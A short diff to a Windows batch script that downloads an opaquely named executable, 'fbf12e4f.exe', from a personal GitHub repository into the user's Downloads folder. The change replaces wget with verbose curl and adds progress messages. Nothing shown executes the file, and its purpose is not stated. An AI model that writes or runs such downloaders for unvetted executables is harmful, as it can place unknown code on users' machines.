@@ -1,4 +1,7 @@
 @echo off
-set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe?raw=true
+set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
 set file=%USERPROFILE%\Downloads\fbf12e4f.exe
-wget --trust-server-names "%url%" -O "%file%"
+echo Downloading file...
+curl -L -v -o "%file%" "%url%"
+echo Download complete. File saved to %file%
+pause
